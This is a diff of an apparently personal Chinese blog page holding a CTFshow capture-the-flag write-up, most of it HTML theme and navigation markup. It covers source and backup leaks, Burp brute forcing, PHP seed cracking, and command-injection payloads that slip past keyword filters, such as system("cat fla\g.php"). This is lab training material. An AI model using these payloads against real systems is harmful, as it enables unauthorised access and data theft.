web263</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web264"><span class="nav-number">1.4.11.</span> <span class="nav-text"> web264</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web265"><span class="nav-number">1.4.12.</span> <span class="nav-text"> web265</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web266"><span class="nav-number">1.4.13.</span> <span class="nav-text"> web266</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web267"><span class="nav-number">1.4.14.</span> <span class="nav-text"> web267</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web275"><span class="nav-number">1.4.15.</span> <span class="nav-text"> web275</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web276"><span class="nav-number">1.4.16.</span> <span class="nav-text"> web276</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web277"><span class="nav-number">1.4.17.</span> <span class="nav-text"> web277</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web278"><span class="nav-number">1.4.18.</span> <span class="nav-text"> web278</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrfcomplete"><span class="nav-number">1.5.</span> <span class="nav-text"> SSRF(Complete)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web351"><span class="nav-number">1.5.1.</span> <span class="nav-text"> web351</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web352"><span class="nav-number">1.5.2.</span> <span class="nav-text"> web352</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web353"><span class="nav-number">1.5.3.</span> <span class="nav-text"> web353</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web354"><span class="nav-number">1.5.4.</span> <span class="nav-text"> web354</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web355"><span class="nav-number">1.5.5.</span> <span class="nav-text"> web355</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web356"><span class="nav-number">1.5.6.</span> <span class="nav-text"> web356</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web357"><span class="nav-number">1.5.7.</span> <span class="nav-text"> web357</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web358"><span class="nav-number">1.5.8.</span> <span class="nav-text"> web358</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web359"><span class="nav-number">1.5.9.</span> <span class="nav-text"> web359</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web360"><span class="nav-number">1.5.10.</span> <span class="nav-text"> web360</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">1.6.</span> <span class="nav-text"> 权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web670"><span class="nav-number">1.6.1.</span> <span class="nav-text"> web670</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AyaN0"
+      src="/images/lly.jpg">
+  <p class="site-author-name" itemprop="name">AyaN0</p>
+  <div class="site-description" itemprop="description">不断的前进的人:只有0次摔倒或无数次的爬起</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kisakiayano" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kisakiayano" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1594453512@qq.com" title="E-Mail → 1594453512@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ayan0.top/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lly.jpg">
+      <meta itemprop="name" content="AyaN0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of AyaN0">
+      <meta itemprop="description" content="不断的前进的人:只有0次摔倒或无数次的爬起">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="刷题蛆来咯-CTFshow | Blog of AyaN0">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          刷题蛆来咯-CTFshow
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-07-07 14:19:38" itemprop="dateCreated datePublished" datetime="2025-07-07T14:19:38+08:00">2025-07-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-07-25 18:23:24" itemprop="dateModified" datetime="2025-07-25T18:23:24+08:00">2025-07-25</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>37k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1:07</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前面忘了后面忘了记录下就对了"><a class="markdownIt-Anchor" href="#前面忘了后面忘了记录下就对了"></a> 前面忘了，后面忘了，记录下就对了</h1>
+<h2 id="信息收集complete"><a class="markdownIt-Anchor" href="#信息收集complete"></a> 信息收集(Complete)</h2>
+<h3 id="web01"><a class="markdownIt-Anchor" href="#web01"></a> web01</h3>
+<p>入门，看源码，<code>view-source</code>/F12</p>
+<h3 id="web02"><a class="markdownIt-Anchor" href="#web02"></a> web02</h3>
+<p>写的无法查看就无法查看了吗?</p>
 <p>非也非也</p>
 <p><code>view-source</code></p>
 <p>其实可以顺带观察一下源码的JS</p>
@@ -169,7 +315,6 @@
 	window.onselectstart = function()&#123;return false&#125;;
 	window.onkeydown = function()&#123;if (event.keyCode==123)&#123;event.keyCode=0;event.returnValue=false;&#125;&#125;;
 &lt;/script&gt;</code></pre>
-
 <p>可以看到第一个控制了右击鼠标事件，第二个控制了选择事件，第三给控制了键盘输入</p>
 <p>并且返回结果都是false，这样你当然就无法进行任何操作了啦啦啦</p>
 <pre><code class="highlight plaintext">禁止鼠标右键：oncontextmenu=function()&#123;return false&#125;;
@@ -181,28 +326,28 @@
 禁止粘贴：&lt;input type=text onpaste=function()&#123;return false&#125;;&gt;
 禁止剪贴：oncut = function()&#123;return false&#125;;；
 关闭输入法：&lt;input style=&quot;ime-mode:disabled&quot;&gt;</code></pre>
-
-
-
-<h3 id="web03"><a href="#web03" class="headerlink" title="web03"></a>web03</h3><p>提示抓包，那就抓</p>
+<h3 id="web03"><a class="markdownIt-Anchor" href="#web03"></a> web03</h3>
+<p>提示抓包，那就抓</p>
 <p>bp发包直接看到flag在header里面</p>
 <p>或者你F12看一眼<code>Network(网络)</code>刷新一下，点进url也可以从标头这里找到</p>
-<h3 id="web04"><a href="#web04" class="headerlink" title="web04"></a>web04</h3><p>提示robots</p>
+<h3 id="web04"><a class="markdownIt-Anchor" href="#web04"></a> web04</h3>
+<p>提示robots</p>
 <p>那就是<code>robots.txt(爬虫协议)</code>，告诉你哪些可以爬，哪些不能爬来的</p>
 <p>真实场景记得别手贱就好了。。CTF倒是无所谓</p>
 <pre><code class="highlight plaintext">User-agent: *
 Disallow: /flagishere.txt</code></pre>
-
-<h3 id="web05"><a href="#web05" class="headerlink" title="web05"></a>web05</h3><p>提示<code>phps</code>源码泄露</p>
+<h3 id="web05"><a class="markdownIt-Anchor" href="#web05"></a> web05</h3>
+<p>提示<code>phps</code>源码泄露</p>
 <p>众所周知</p>
 <p><code>phps php~ php.bak</code>这些都是源码泄露，扫到就是赚到</p>
-<h3 id="web06"><a href="#web06" class="headerlink" title="web06"></a>web06</h3><p>解压源码到当前目录是想赤紫蛋了，感觉是<code>www.zip</code>或者<code>.git</code>之类的</p>
-<p>扫一下，是<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<h3 id="web06"><a class="markdownIt-Anchor" href="#web06"></a> web06</h3>
+<p>解压源码到当前目录是想赤紫蛋了，感觉是<code>www.zip</code>或者<code>.git</code>之类的</p>
+<p>扫一下，是www.zip</p>
 <p>下下来看到目录里有<code>index.php</code>和<code>fl000g.txt</code></p>
 <p>打开一眼<code>fakeflag</code>，但是路径应该没错</p>
 <p>闻着味摸过去拿到flag</p>
-<h3 id="web07"><a href="#web07" class="headerlink" title="web07"></a>web07</h3><pre><code class="highlight plaintext">版本控制很重要，但不要部署到生产环境更重要。</code></pre>
-
+<h3 id="web07"><a class="markdownIt-Anchor" href="#web07"></a> web07</h3>
+<pre><code class="highlight plaintext">版本控制很重要，但不要部署到生产环境更重要。</code></pre>
 <p>不懂，先吃我一扫</p>
 <p>扫出来<code>/.git/</code>，直接给了</p>
 <p>网上找了点解释</p>
@@ -210,95 +355,92 @@ Disallow: /flagishere.txt</code></pre>
 
 由于部署项目的方便，有很多运维人员直接在网站根目录使用 git clone 项目地址，此时网站根目录就会存在 .git 目录，通过该目录就可以回滚到某个版本或者下载最新的项目源码。
 githack:https://github.com/BugScanTeam/GitHack</code></pre>
-
-<h3 id="web08"><a href="#web08" class="headerlink" title="web08"></a>web08</h3><p>hint是一样的。。</p>
+<h3 id="web08"><a class="markdownIt-Anchor" href="#web08"></a> web08</h3>
+<p>hint是一样的。。</p>
 <p>那再吃我一扫,扫到<code>/.svn/</code>，也是直接给</p>
-<h3 id="web09"><a href="#web09" class="headerlink" title="web09"></a>web09</h3><pre><code class="highlight plaintext">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</code></pre>
-
+<h3 id="web09"><a class="markdownIt-Anchor" href="#web09"></a> web09</h3>
+<pre><code class="highlight plaintext">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</code></pre>
 <p>vim？那我可要闻着味过来了</p>
 <p>vim强制关闭时会产生一个<code>.swp</code>文件</p>
 <pre><code class="highlight plaintext">belike: index.php -&gt; index.php.swp</code></pre>
-
 <p>下过来就直接给了</p>
-<h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><pre><code class="highlight plaintext">cookie 只是一块饼干，不能存放任何隐私数据</code></pre>
-
+<h3 id="web10"><a class="markdownIt-Anchor" href="#web10"></a> web10</h3>
+<pre><code class="highlight plaintext">cookie 只是一块饼干，不能存放任何隐私数据</code></pre>
 <p>并非饼干，可以抓个包看看</p>
 <p>抓到包直接Cookie: flag就写你脸上了</p>
-<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><pre><code class="highlight plaintext">域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息</code></pre>
-
+<h3 id="web11"><a class="markdownIt-Anchor" href="#web11"></a> web11</h3>
+<pre><code class="highlight plaintext">域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息</code></pre>
 <p>通过dns检查查询flag <a target="_blank" rel="noopener" href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</p>
 <p>查找flag.ctfshow.com域名下的txt记录</p>
-<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><pre><code class="highlight plaintext">有时候网站上的公开信息，就是管理员常用密码</code></pre>
-
+<h3 id="web12"><a class="markdownIt-Anchor" href="#web12"></a> web12</h3>
+<pre><code class="highlight plaintext">有时候网站上的公开信息，就是管理员常用密码</code></pre>
 <pre><code class="highlight plaintext">Help Line Number : 372619038</code></pre>
-
 <p>扫出来一个<code>admin/index.php</code></p>
 <p>登录成功力，直接拿到flag</p>
-<h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><pre><code class="highlight plaintext">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</code></pre>
-
+<h3 id="web13"><a class="markdownIt-Anchor" href="#web13"></a> web13</h3>
+<pre><code class="highlight plaintext">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</code></pre>
 <p>根据提示感觉像弱密码</p>
 <p>结果是泄露。<code>/home</code>下面探一堆找到那个<code>Document</code></p>
 <p>点进去就是一个使用指南，按所给信息登录就行</p>
-<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><pre><code class="highlight plaintext">有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</code></pre>
-
+<h3 id="web14"><a class="markdownIt-Anchor" href="#web14"></a> web14</h3>
+<pre><code class="highlight plaintext">有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</code></pre>
 <p>仔细观察源码，看到一个路径<code>editor/upload/banner-app.png</code></p>
 <p>upload被禁止访问了，只能到<code>/editor</code>翻一下</p>
 <p>翻到一个插入文件，没想到能直接调用服务器本地文件系统。</p>
 <p>翻一下</p>
 <p>直接拿到flag<code>路径:nothinghere/fl000g.txt</code></p>
-<h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><pre><code class="highlight plaintext">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</code></pre>
-
+<h3 id="web15"><a class="markdownIt-Anchor" href="#web15"></a> web15</h3>
+<pre><code class="highlight plaintext">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</code></pre>
 <p>看一眼邮箱</p>
 <pre><code class="highlight plaintext">1156631961@qq.com</code></pre>
-
 <p>又扫到<code>/admin/</code>了</p>
 <p>试一下都不对啊。是不是要忘记密码</p>
 <p>要回答城市。。原来是社工题目吗哈哈。。</p>
 <p>QQ找一下就好了</p>
-<h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><pre><code class="highlight plaintext">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</code></pre>
-
+<h3 id="web16"><a class="markdownIt-Anchor" href="#web16"></a> web16</h3>
+<pre><code class="highlight plaintext">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</code></pre>
 <p>用<code>wappalyzer</code>看一眼，语言是PHP，PHP探针没跑了，探针泄露路径<code>tz.php</code></p>
 <p>发现可以直接查看<code>phpinfo()</code></p>
 <p>直接摸到flag</p>
-<h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><pre><code class="highlight plaintext">备份的sql文件会泄露敏感信息</code></pre>
-
+<h3 id="web17"><a class="markdownIt-Anchor" href="#web17"></a> web17</h3>
+<pre><code class="highlight plaintext">备份的sql文件会泄露敏感信息</code></pre>
 <p>不知道指的是<code>.bak</code>的后缀还是什么</p>
 <p>扫到一个<code>backup.sql</code></p>
 <p>打开flag直接就在里面</p>
-<h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><pre><code class="highlight plaintext">不要着急，休息，休息一会儿，玩101分给你flag</code></pre>
-
+<h3 id="web18"><a class="markdownIt-Anchor" href="#web18"></a> web18</h3>
+<pre><code class="highlight plaintext">不要着急，休息，休息一会儿，玩101分给你flag</code></pre>
 <p>看来是web前端题了</p>
 <p>当然先看一眼有没有源码直接给</p>
 <p>摸到一个unicode编码</p>
 <pre><code class="highlight plaintext">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</code></pre>
-
 <p>转换过来就是:你赢了，去幺幺零点皮爱吃皮看看</p>
 <p><code>110.php</code></p>
 <p>直接给了flag</p>
-<h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><pre><code class="highlight plaintext">密钥什么的，就不要放在前端了</code></pre>
-
+<h3 id="web19"><a class="markdownIt-Anchor" href="#web19"></a> web19</h3>
+<pre><code class="highlight plaintext">密钥什么的，就不要放在前端了</code></pre>
 <p>看起来像一个密钥泄露嗯。。是flask的SECRET_KEY吗？还是什么。看一眼先</p>
 <p>好吧高估了，就是一个判断逻辑放在了前端并且密码和用户都是明文</p>
 <p>但是显示密码错误，猜测是放的密码是被加密过的</p>
 <p>那么尝试抓包改密码看看这个加密是在前端还是在后端的</p>
 <p>结果是前端，直接得到flag</p>
-<h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><pre><code class="highlight plaintext">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</code></pre>
-
+<h3 id="web20"><a class="markdownIt-Anchor" href="#web20"></a> web20</h3>
+<pre><code class="highlight plaintext">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</code></pre>
 <p>通过了解如果数据库未设置访问权限的话，是可以直接访问 把数据库给下载下来的</p>
 <p>尝试通过默认名称<code>database.mdb</code>访问无果，但是扫到了<code>/db</code></p>
 <p>但是访问不了，用一下递归扫描，摸到了<code>db.mdb</code></p>
 <p>下载到本地用010搜一下关键字就可以</p>
-<h2 id="爆破-Complete"><a href="#爆破-Complete" class="headerlink" title="爆破(Complete)"></a>爆破(Complete)</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><pre><code class="highlight plaintext">爆破什么的，都是基操</code></pre>
-
+<h2 id="爆破complete"><a class="markdownIt-Anchor" href="#爆破complete"></a> 爆破(Complete)</h2>
+<h3 id="web21"><a class="markdownIt-Anchor" href="#web21"></a> web21</h3>
+<pre><code class="highlight plaintext">爆破什么的，都是基操</code></pre>
 <p>上来就弹是吧?上bp</p>
 <p>这里了解一下bp的<strong>Custom iterator</strong>模式</p>
 <p>可以将palyload分块处理</p>
 <p>比如这题的账号密码其实是以这种方式存在的</p>
 <pre><code class="highlight plaintext">base64encode(username:passwd)</code></pre>
-
 <p>并且注入位置在<code>Authorization</code></p>
 <p>记得把最后的<code>urlencode</code>给去掉</p>
-<h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web23"><a class="markdownIt-Anchor" href="#web23"></a> web23</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;
@@ -313,11 +455,9 @@ githack:https://github.com/BugScanTeam/GitHack</code></pre>
 
 &#125;
 <span class="meta">?&gt;</span></code></pre>
-
 <p>具体要求是这样:</p>
 <pre><code class="highlight plaintext">第2位要和第15位相等，第15位要和第18位相等
 并且第2位+第15位+第18位/第2位要等于第32位</code></pre>
-
 <pre><code class="highlight php"><span class="comment">#encoding=gbk</span>
 import hashlib
 
@@ -353,8 +493,8 @@ def <span class="title function_ invoke__">check</span>(md5str):
         <span class="keyword">print</span>(f<span class="string">&quot;    md5: &#123;md5val&#125;&quot;</span>)
         <span class="keyword">break</span>
 </code></pre>
-
-<h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web24"><a class="markdownIt-Anchor" href="#web24"></a> web24</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;
@@ -367,10 +507,10 @@ def <span class="title function_ invoke__">check</span>(md5str):
     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
     <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);
 &#125;</code></pre>
-
 <p>一个伪随机数的问题。种子固定，随机值是固定的那几个</p>
 <p>自己拿php跑一下这个种子的随机值传参即可</p>
-<h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web25"><a class="markdownIt-Anchor" href="#web25"></a> web25</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 
 <span class="comment">/*</span>
 <span class="comment"># -*- coding: utf-8 -*-</span>
@@ -402,52 +542,51 @@ def <span class="title function_ invoke__">check</span>(md5str):
     <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);
 &#125;
 </code></pre>
-
-<p>我们来理一下 </p>
+<p>我们来理一下</p>
 <pre><code class="highlight plaintext">1.将flag:MD5编码--&gt;取[0:7]--&gt;作为hex转换成十进制--&gt;作为种子
 2.比较token和2*mt_rand()</code></pre>
-
 <p>还是好解决的，因为返回了<code>$rand</code>值，可以逆着推出<code>$mt_rand</code></p>
 <p>这里是894610327</p>
 <p>使用<code>php_mt_rand</code>工具来破解一下，并结合当前PHP版本得到了合适的种子</p>
 <pre><code class="highlight plaintext">1324767434 
 2626545208 
 3845172103</code></pre>
-
-<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709152756959.png" alt="image-20250709152756959"></p>
+<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709152756959.png" alt="image-20250709152756959"></p>
 <p>运气不是很好啊。。那只能一个个试过去了</p>
 <p>结果都没打出来，何意呢。。重新开了靶机再试，104429216</p>
 <pre><code class="highlight plaintext">131270818
 2698696663 
 3895390800</code></pre>
-
 <p>。？还是出不来，仔细再看一眼</p>
 <p>搞错了搞成1+2了原来是2+3啊哈哈。。</p>
 <p>最后试出来是第三个</p>
-<h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p>安装界面直接连接就说连上了。。好怪啊。</p>
+<h3 id="web26"><a class="markdownIt-Anchor" href="#web26"></a> web26</h3>
+<p>安装界面直接连接就说连上了。。好怪啊。</p>
 <p>找找源码，找到一个<code>checkdb.php</code></p>
-<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709160523122.png" alt="image-20250709160523122"></p>
+<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709160523122.png" alt="image-20250709160523122"></p>
 <pre><code class="highlight plaintext">POST：a=&amp;p=&amp;u=&amp;d=&amp;pass=</code></pre>
-
-<p>但是其实抓包抓一下可以直接看到flag的。<img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709161018103.png" alt="image-20250709161018103"></p>
-<h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p>本来以为是爆破admin的密码爆了半天没收获结果发现是让我爆破人身份证号码。</p>
+<p>但是其实抓包抓一下可以直接看到flag的。<img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709161018103.png" alt="image-20250709161018103"></p>
+<h3 id="web27"><a class="markdownIt-Anchor" href="#web27"></a> web27</h3>
+<p>本来以为是爆破admin的密码爆了半天没收获结果发现是让我爆破人身份证号码。</p>
 <pre><code class="highlight plaintext">高先伊
 621022********5237</code></pre>
-
 <p>这边爆破一下日期</p>
-<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709162357752.png" alt="image-20250709162357752"></p>
+<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709162357752.png" alt="image-20250709162357752"></p>
 <p>爆破了半天得到621022199002015237</p>
-<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709165512904.png" alt="image-20250709165512904"></p>
+<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709165512904.png" alt="image-20250709165512904"></p>
 <p>登录就可以拿到flag</p>
-<h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p>挺邪门的题目，随便改URL的话会显示重定向过多</p>
+<h3 id="web28"><a class="markdownIt-Anchor" href="#web28"></a> web28</h3>
+<p>挺邪门的题目，随便改URL的话会显示重定向过多</p>
 <p>尝试把最后的去掉，对0和1的位置进行1-100遍历(问就是扫出来是1-100)</p>
 <p>这里使用<code>Cluster bomb</code>模式</p>
 <p><code>payload type</code>为<code>Numbers</code></p>
 <p>对1和2位置都设置1-100</p>
-<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709172439403.png" alt="image-20250709172439403"></p>
-<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>好玩爱玩，好吃爱吃</p>
+<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250709172439403.png" alt="image-20250709172439403"></p>
+<h2 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h2>
+<p>好玩爱玩，好吃爱吃</p>
 <p>喜欢我RCE吗</p>
-<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><pre><code class="highlight plaintext">&lt;?php
+<h3 id="web29"><a class="markdownIt-Anchor" href="#web29"></a> web29</h3>
+<pre><code class="highlight plaintext">&lt;?php
 error_reporting(0);
 if(isset($_GET[&#x27;c&#x27;]))&#123;
     $c = $_GET[&#x27;c&#x27;];
@@ -458,14 +597,12 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;</code></pre>
-
 <p>简单的绕过</p>
-<p><code>\ &#39;&#39; &quot; &quot; `` </code>都可以绕过，加在flag里就行</p>
+<p><code>\ '' &quot; &quot; `` </code>都可以绕过，加在flag里就行</p>
 <pre><code class="highlight plaintext">?c=system(&quot;cat fla\g.php&quot;);</code></pre>
-
 <p>然后看源码注释掉的部分即可</p>
-<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code class="highlight plaintext">命令执行，需要严格的过滤</code></pre>
-
+<h3 id="web30"><a class="markdownIt-Anchor" href="#web30"></a> web30</h3>
+<pre><code class="highlight plaintext">命令执行，需要严格的过滤</code></pre>
 <p>那看来过滤很不严格了</p>
 <pre><code class="highlight plaintext">&lt;?php
 error_reporting(0);
@@ -478,11 +615,10 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;</code></pre>
-
 <p>懒得看多出来的过滤，和我的通配符说去吧</p>
 <pre><code class="highlight plaintext">?c=passthru(&quot;cat fl*&quot;);</code></pre>
-
-<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code class="highlight plaintext">&lt;?php
+<h3 id="web31"><a class="markdownIt-Anchor" href="#web31"></a> web31</h3>
